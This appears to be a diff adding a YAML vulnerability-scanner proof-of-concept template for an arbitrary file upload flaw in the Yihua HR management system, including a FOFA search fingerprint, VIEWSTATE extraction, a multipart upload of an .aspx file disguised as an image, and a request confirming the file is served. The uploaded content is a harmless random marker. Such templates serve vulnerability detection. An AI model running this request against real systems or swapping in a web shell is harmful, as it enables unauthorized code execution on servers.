@@ -1,0 +1,77 @@
+id: poc-yaml-yihua-hr-ms-default-anyfile-upload
+info:
+  name: 亿华人力资源管理系统 default 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 亿华考勤系统
+  fofa: body="亿华人力资源管理系统"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: GET
+  path: /filemanage/file/default.aspx
+  expression: status_code == 200 && contains(title,"EHR -- 文件管理")
+  output:
+  - regex_match(body,"id=\"__VIEWSTATE\" value=\"(?P<VIEWSTATE>.*?)\"")
+  - regex_match(body,"id=\"__VIEWSTATEGENERATOR\" value=\"(?P<VIEWSTATEGENERATOR>.*?)\"")
+- method: POST
+  path: /filemanage/file/default.aspx
+  headers:
+    Content-Type: multipart/form-data; boundary=----geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+  data: '------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+
+    Content-Disposition: form-data; name="__VIEWSTATE"
+
+
+    {{.VIEWSTATE}}
+
+    ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+
+    Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+
+    {{.VIEWSTATEGENERATOR}}
+
+    ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+
+    Content-Disposition: form-data; name="fileToUpload"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+
+    Content-Disposition: form-data; name="UploadBtn"
+
+
+    上传文件
+
+    ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+
+    Content-Disposition: form-data; name="NewFileText"
+
+
+
+    ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+
+    Content-Disposition: form-data; name="NewFolderText"
+
+
+
+    ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
+
+    Content-Disposition: form-data; name="setRootTxt"
+
+
+
+    ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37--'
+  expression: "status_code == 200 && \ncontains(title,\"EHR -- 文件管理\") &&\ncontains(body,\"\
+    文件上传成功\")\n"
+- method: GET
+  path: /FilesUpload/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
